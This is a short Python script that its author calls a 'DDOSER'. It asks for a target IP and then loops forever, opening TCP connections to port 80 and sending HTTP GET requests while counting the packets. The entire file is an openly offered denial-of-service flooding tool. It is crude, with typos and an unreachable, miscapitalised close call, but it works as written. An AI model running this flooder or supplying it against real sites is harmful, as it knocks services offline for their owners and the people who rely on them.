from socket import *
#make the by sadra
u = input('''
Hello, I am Amir Sadra
I am the creator of this DDOSER
Please do not test Iranian sitesinter the ip site start ip----->''')
p=0

while True:
     s = socket(AF_INET , SOCK_STREAM)
     s.connect((u,80))
     payamersali = s.send("GET / HTTP/1.1\r\nHost:facbook.com\r\n\r\n".encode(encoding='utf-8'))
     p=p+1
     print("sendpocket",p)
S.close()